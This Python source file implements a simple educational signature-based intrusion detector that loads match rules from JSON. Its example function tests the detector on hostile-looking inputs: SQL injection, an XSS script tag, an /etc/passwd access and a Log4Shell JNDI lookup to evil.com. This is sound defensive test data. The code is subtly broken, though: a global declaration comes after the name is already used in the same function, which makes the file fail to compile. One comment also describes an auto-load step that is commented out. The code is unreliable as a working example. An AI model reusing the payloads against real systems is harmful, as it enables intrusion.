import re
import json
import os
import logging # Added

# Configure logger for this module
logger = logging.getLogger(__name__) # Added

# --- Development/Educational Purposes Only ---
# Basic signature-based IDS. Signatures are loaded from an external JSON file.
# --- Development/Educational Purposes Only ---

DEFAULT_SIGNATURE_FILE = os.path.join(os.path.dirname(__file__), "default_signatures.json")
LOADED_SIGNATURES = [] # Global store for loaded signatures

def load_signatures_from_file(filepath: str = DEFAULT_SIGNATURE_FILE) -> list:
    """
    Loads intrusion detection signatures from a JSON file.

    Args:
        filepath (str): The path to the JSON file containing the signatures.

    Returns:
        list: A list of signature dictionaries. Returns an empty list if file not found
              or if there's an error parsing the file.
    """
    global LOADED_SIGNATURES
    LOADED_SIGNATURES = [] # Clear previous signatures if reloading

    if not os.path.exists(filepath):
        logger.error(f"Signature file not found: {filepath}") # Changed
        return LOADED_SIGNATURES

    try:
        with open(filepath, 'r') as f:
            signatures_data = json.load(f)

        if not isinstance(signatures_data, list):
            logger.error(f"Signature file {filepath} should contain a JSON list of signatures.") # Changed
            return LOADED_SIGNATURES

        valid_signatures = []
        for i, sig_data in enumerate(signatures_data):
            if not isinstance(sig_data, dict):
                logger.warning(f"Signature entry {i} in {filepath} is not a valid dictionary. Skipping.") # Changed
                continue

            # Basic validation for required fields
            required_fields = ["id", "name", "type", "pattern"]
            if not all(field in sig_data for field in required_fields):
                logger.warning(f"Signature entry {i} (ID: {sig_data.get('id', 'N/A')}) in {filepath} is missing required fields ({', '.join(required_fields)}). Skipping.") # Changed
                continue

            if sig_data["type"] not in ["string", "regex"]:
                logger.warning(f"Signature ID {sig_data['id']} has invalid type '{sig_data['type']}'. Must be 'string' or 'regex'. Skipping.") # Changed
                continue

            # For regex type, try to compile it to catch errors early (optional, but good practice)
            if sig_data["type"] == "regex":
                try:
                    re.compile(sig_data["pattern"], re.IGNORECASE) # Check if regex is valid
                except re.error as e:
                    logger.warning(f"Signature ID {sig_data['id']} has invalid regex pattern '{sig_data['pattern']}': {e}. Skipping.") # Changed
                    continue

            valid_signatures.append(sig_data)

        LOADED_SIGNATURES = valid_signatures
        logger.info(f"Successfully loaded {len(LOADED_SIGNATURES)} signatures from {filepath}.") # Changed

    except json.JSONDecodeError as e:
        logger.exception(f"Error decoding JSON from signature file {filepath}: {e}") # Changed
    except Exception as e:
        logger.exception(f"An unexpected error occurred while loading signatures from {filepath}: {e}") # Changed

    return LOADED_SIGNATURES

def check_signatures(data_input: str) -> list:
    """
    Checks the input data against the loaded set of signatures.

    Args:
        data_input (str): The data to check (e.g., log line, packet payload snippet).

    Returns:
        list: A list of matched signature objects (dictionaries).
              Returns an empty list if no signatures match or data is invalid.
    """
    matched_alerts = [] # Store full signature dict for more info
    if not LOADED_SIGNATURES:
        # logger.warning("No signatures loaded. Cannot perform check.") # Changed
        # Optionally, try to load them here if not already loaded.
        # load_signatures_from_file() # This could be a fallback
        if not LOADED_SIGNATURES: # Check again after attempting load
             logger.warning("No signatures loaded and auto-load failed. Cannot perform check.") # Changed
             return matched_alerts


    if not isinstance(data_input, str):
        logger.error("Input data for signature check must be a string.") # Changed
        return matched_alerts

    for sig in LOADED_SIGNATURES:
        try:
            if sig["type"] == "string":
                if sig["pattern"] in data_input:
                    matched_alerts.append(sig)
            elif sig["type"] == "regex":
                if re.search(sig["pattern"], data_input, re.IGNORECASE):
                    matched_alerts.append(sig)
        except re.error as e:
            # This should ideally be caught during loading, but as a safeguard:
            logger.error(f"Regex error during matching for signature {sig['id']} ('{sig['name']}'): {e}", exc_info=True) # Changed
            pass
        except Exception as e:
            logger.exception(f"Error processing signature {sig['id']} ('{sig['name']}') during match: {e}") # Changed
            pass

    return matched_alerts

def example_usage():
    # BasicConfig for logging if this script is run directly.
    if not logger.handlers and not logging.getLogger().handlers: # Avoid adding multiple handlers
        logging.basicConfig(level=logging.INFO,
                            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                            handlers=[logging.StreamHandler()])

    logger.info("### Running Improved Signature-Based IDS Example (File Loaded) ###") # Changed

    # Attempt to load signatures (could also be done at module import)
    # If default_signatures.json is not found, this will print an error
    # but the example will continue with an empty signature list.
    load_signatures_from_file()

    if not LOADED_SIGNATURES:
        logger.warning("No signatures were loaded. Example will not find any matches.") # Changed
        # Create a dummy signature for the example to proceed if file was missing
        # This is for demonstration if the JSON file isn't created by the subtask runner for some reason.
        global LOADED_SIGNATURES
        LOADED_SIGNATURES.append({
            "id": "DUMMY001", "name": "Dummy Test Signature (for example execution if file fails)",
            "type": "string", "pattern": "dummy_pattern_test",
            "description":"A fallback signature.", "severity": "Low"
        })
        logger.info(f"Added a dummy signature for example execution: {LOADED_SIGNATURES[0]['name']}") # Changed


    test_data_benign = [
        "GET /index.html HTTP/1.1 User-Agent: GoodBot/2.0",
        "This is a normal log entry.",
        "SELECT id, name FROM users WHERE id = 1"
    ]

    test_data_suspicious = [
        "GET /admin.php?query=SELECT%20*%20FROM%20users HTTP/1.1 User-Agent: Mozilla/5.0",
        "POST /upload.aspx HTTP/1.1 User-Agent: BadBot/1.0 attempting to upload cmd.php",
        "GET /page.html?name=<script>alert('XSS')</script> HTTP/1.1",
        "User tried to access /etc/passwd",
        "GET / HTTP/1.1 User-Agent: Nikto/2.1.6 (Evasions:None) (Test:001)",
        "New attack with ${jndi:ldap://evil.com/a}"
    ]

    logger.info("\n--- Checking Benign Data ---") # Changed
    for i, data in enumerate(test_data_benign):
        matches = check_signatures(data)
        if matches:
            logger.info(f"Data {i+1}: '{data[:50]}...' -> Matches: {[m['name'] for m in matches]}") # Changed
        else:
            logger.info(f"Data {i+1}: '{data[:50]}...' -> Matches: None") # Changed


    logger.info("\n--- Checking Suspicious Data ---") # Changed
    for i, data in enumerate(test_data_suspicious):
        matches = check_signatures(data)
        if matches:
            logger.info(f"Data {i+1}: '{data[:70]}...' -> Matches: {[m['name'] for m in matches]} (Severities: {[m.get('severity', 'N/A') for m in matches]})") # Changed
        else:
            logger.info(f"Data {i+1}: '{data[:70]}...' -> Matches: None") # Changed

    logger.info("\n--- Testing with a custom signature file (conceptual) ---") # Changed
    custom_sig_path = "custom_test_signatures.json"
    custom_sigs_data = [
        {"id": "CUST001", "name": "Custom Test Rule", "type": "string", "pattern": "my_secret_pattern", "severity": "High"}
    ]
    # Create a temporary custom signature file for the example
    try:
        with open(custom_sig_path, 'w') as f_custom:
            json.dump(custom_sigs_data, f_custom)

        logger.info(f"Loading custom signatures from {custom_sig_path}...") # Changed
        load_signatures_from_file(custom_sig_path)

        custom_test_data = "This log contains my_secret_pattern somewhere."
        matches = check_signatures(custom_test_data)
        if matches:
             logger.info(f"Data: '{custom_test_data[:50]}...' -> Matches: {[m['name'] for m in matches]}") # Changed
        else:
            logger.info(f"Data: '{custom_test_data[:50]}...' -> Matches: None") # Changed

    except Exception as e:
        logger.exception(f"Error in custom signature test section: {e}") # Changed
    finally:
        if os.path.exists(custom_sig_path):
            os.remove(custom_sig_path) # Clean up

if __name__ == "__main__":
    # Configure basicConfig here ensures it's set when script is run directly.
    if not logging.getLogger().handlers:
        logging.basicConfig(level=logging.INFO,
                            format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
                            handlers=[logging.StreamHandler()])
    logger.info("Starting signature_ids.py example usage...") # Changed
    # Initial load attempt (can be called here or at module level)
    # load_signatures_from_file()
    example_usage()
